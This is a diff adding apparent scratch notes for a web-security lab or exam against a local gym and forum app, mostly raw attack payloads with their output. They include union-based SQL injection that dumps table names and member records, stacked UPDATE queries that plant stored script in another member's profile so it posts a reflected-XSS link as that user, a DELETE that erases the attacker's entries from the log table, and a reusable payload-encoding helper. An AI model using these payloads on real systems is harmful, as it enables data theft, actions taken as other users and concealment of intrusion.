@@ -1,0 +1,261 @@
+7700001
+fit-nabila-17
+
+Member	Credits Remaining
+Nabila Chowdhury	18
+
+fit-nabila-17' and '1'='1
+fit-nabila-17' and '1'='0
+
+fit-nabila-17' order by 5 limit 1 -- -
+total colm 5 ta
+
+' union select 1,2,3,4,5 -- -
+
+Member	Credits Remaining
+3 4	5
+
+db name = b1_gym
+
+' union select 1,2,'', 
+
+group_concat(table_name)
+
+,5 
+from information_schema.tables where table_schema = database()
+-- -
+
+log,membership
+
+for log table now
+
+' union select 1,2,'', 
+
+group_concat(column_name)
+
+,5 
+from information_schema.columns where table_name = 'log'
+-- -
+
+log table:
+attempted_at,id,submitted_id,submitted_secret
+
+
+' union select 1,2,'', 
+
+group_concat(column_name)
+
+,5 
+from information_schema.columns where table_name = 'membership'
+-- -
+
+membership table
+access_code,credits_remaining,first_name,id,last_name
+
+
+' union select 1,2,'', 
+
+group_concat(id, ' ', first_name, ' ', last_name, ': ', credits_remaining, '<br>')
+
+,5 
+from membership -- -
+
+7700001 Nabila Chowdhury: 18
+,7700002 Rafi Islam: 7
+,7700003 Sadia Alam: 24
+,7700004 Arman Bashar: 11
+,7700005 Sumaiya Reza: 29
+,7700006 Nafis Iqbal: 3
+,7700007 Pranto Saha: 15
+,7700008 Ornela Das: 21
+,7700009 Mahin Azad: 0
+,7700010 Rumana Ferdous: 26
+,7700011 Tanvir Amin: 9
+,7700012 Samira Huq: 13
+,7700013 Rafid Anwar: 5
+,7700014 Muntaha Zaman: 30
+,7700015 Shafin Roy: 16
+
+
+
+fit-nabila-17'; update membership set last_name = '<b>Islam</b>' where id = 7700002; -- -
+
+Member	Credits Remaining
+Rafi <b>Islam</b>	7
+
+nabila.chowdhury
+forum-Nabila-17
+
+as fetch:
+
+await fetch("http://localhost:5001/reply", {
+    "credentials": "include",
+    "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Upgrade-Insecure-Requests": "1",
+        "Sec-Fetch-Dest": "document",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-Site": "same-origin",
+        "Sec-Fetch-User": "?1",
+        "Priority": "u=0, i"
+    },
+    "referrer": "http://localhost:5001/",
+    "body": "message=hi",
+    "method": "POST",
+    "mode": "cors"
+});
+
+await fetch("http://localhost:5001/reply", {
+    "credentials": "include",
+    "headers": {
+        "Content-Type": "application/x-www-form-urlencoded",
+        },
+    "body": "message=hi+http://localhost:5001/search?q=<script>document.title='B1-REFLECTED-XSS'</script>",
+    "method": "POST",
+});
+
+Reected-XSS link (3 marks): The posted message must contain a working, clickable search
+URL. Opening it must change only that page's title to B1-REFLECTED-XSS. The script must not
+execute merely from viewing the ordinary Forum feed and must not persist on unrelated searches.
+
+http://localhost:5001/search?q=<script>document.title='B1-REFLECTED-XSS'</script>
+
+
+
+http%3A%2F%2Flocalhost%3A5001%2Fsearch%3Fq%3D%3Cscript%3Edocument.title%3D%27B1-REFLECTED-XSS%27%3C%2Fscript%3E
+
+python one:
+fit-nabila-17'; update membership set last_name = concat(
+    '<script>
+        fetch("http://localhost:5001/reply", 
+        {
+            "credentials": "include",
+            "headers": {
+                "Content-Type": "application/x-www-form-urlencoded",
+                },
+            "body": "message=http%3A%2F%2Flocalhost%3A5001%2Fsearch%3Fq%3D%253Cscript%253Edocument.title%253D%2522B1-REFLECTED-XSS%2522%253C%252Fscript%253E",
+            "method": "POST",
+        }
+    );
+    </script>'
+)
+where id = 7700002;
+-- -
+
+test:
+<script>document.title="B1-REFLECTED-XSS";</script>
+-> %3Cscript%3Edocument.title%3D%22B1-REFLECTED-XSS%22%3B%3C%2Fscript%3E
+
+fit-nabila-17'; update membership set last_name = concat(
+    '<script>
+        fetch("http://localhost:5001/reply", 
+        {
+            "credentials": "include",
+            "headers": {
+                "Content-Type": "application/x-www-form-urlencoded",
+                },
+            "body": "message=http%3A%2F%2Flocalhost%3A5001%2Fsearch%3Fq%3D%253Cscript%253Edocument.title%253D%2522B1-REFLECTED-XSS%2522%253C%255C%252Fscript%253E",
+            "method": "POST",
+        }
+    );
+    </script>'
+)
+where id = 7700002;
+-- -
+
+js one:
+fit-nabila-17'; update membership set last_name = concat(
+    '<script>
+        fetch("http://localhost:5001/reply", 
+        {
+            "credentials": "include",
+            "headers": {
+                "Content-Type": "application/x-www-form-urlencoded",
+                },
+            "body": "message=http%3A%2F%2Flocalhost%3A5001%2Fsearch%3Fq%3D%253Cscript%253Edocument.title%253D%2522B1-REFLECTED-XSS%2522%253C%252Fscript%253E",
+            "method": "POST",
+        }
+    );
+    </script>'
+)
+where id = 7700002;
+-- -
+
+http%3A%2F%2Flocalhost%3A5001%2Fsearch%3Fq%3D%253Cscript%253Edocument.title%253D%2522B1-REFLECTED-XSS%2522%253C%252Fscript%253E
+
+const payload = '<script>document.title="B1-REFLECTED-XSS"<\/script>';
+const link = "http://localhost:5001/search?q=" + encodeURIComponent(payload);
+// const message = '<a href="' + link + '">check this</a>';   // Option A
+const message = link;                                    // Option B
+const body = "message=" + encodeURIComponent(message);
+console.log(body);   // ← copy this exact string for your SQL payload
+fetch("http://localhost:5001/reply", {
+  method: "POST",
+  credentials: "include",
+  headers: { "content-type": "application/x-www-form-urlencoded" },
+  body: body
+});
+
+
+page title changes
+rafi.islam
+forum-Rafi-17
+
+
+'; delete from log where submitted_id=7700001;
+-- -
+
+
+fit-nabila-17'; UPDATE membership SET last_name = '<script>fetch("http://localhost:5001/reply", {"credentials":"include","headers":{"Content-Type":"application/x-www-form-urlencoded"}, "body":"message=http%3A%2F%2Flocalhost%3A5001%2Fsearch%3Fq%3D%253Cscript%253Edocument.title%253D%2522B1-REFLECTED-XSS%2522%253B%253C%252Fscript%253E", "method":"POST"});</script>' WHERE id=7700002; -- -
+
+
+
+
+
+
+
+
+//// arekta payload:
+
+
+// ------------------------------------------------------------
+// ইউনিভার্সাল এনকোডার - C1, B1, A1 সব কাজ করবে
+// ------------------------------------------------------------
+function encodePayload(payload, type) {
+    // ১. প্রথমে বেসিক URL এনকোডিং করি (এটা <, >, /, ", ইত্যাদি কে % স্টাইলে কনভার্ট করে)
+    let encoded = encodeURIComponent(payload);
+    
+    // ২. JavaScript-এর encodeURIComponent ' (সিঙ্গেল কোট) কে এনকোড করে না।
+    //    কিন্তু SQL-এর ভিতরে ' বসালে ইনজেকশন ভেঙ্গে যায়। তাই ম্যানুয়ালি %27 বানাই।
+    encoded = encoded.replace(/'/g, '%27');
+    
+    // ৩. টাইপ চেক করি
+    if (type === 'double') {
+        // ডাবল এনকোড: আগের এনকোডেড স্ট্রিংটাকে আবার পুরোপুরি এনকোড করি।
+        // ফলে % -> %25, : -> %3A, / -> %2F ইত্যাদি হয়ে যায়।
+        let doubleEncoded = encodeURIComponent(encoded);
+        return doubleEncoded;
+    }
+    
+    // সিঙ্গেল এনকোড (ডিফল্ট)
+    return encoded;
+}
+
+// ---------- ব্যবহারের উদাহরণ (Exam Templates) ----------
+
+// ১. C1 / A1-এর জন্য (সরাসরি স্ক্রিপ্ট পোস্ট করতে): সিঙ্গেল এনকোড
+const script = "<script>document.title='C1-SECOND-ORDER-XSS'</script>";
+console.log("✅ C1 / A1 - Single Encode (message-এ বসাও):");
+console.log(encodePayload(script, 'single'));
+
+// ২. B1-এর জন্য (লিংক পোস্ট করতে): ডাবল এনকোড
+const innerScript = "<script>document.title=\"B1-REFLECTED-XSS\"</script>";
+const fullLink = "http://localhost:5001/search?q=" + encodePayload(innerScript, 'single'); // আগে ভেতরেরটা সিঙ্গেল এনকোড
+console.log("\n✅ B1 - Double Encode (message-এ বসাও):");
+console.log(encodePayload(fullLink, 'double'));
+
+
+
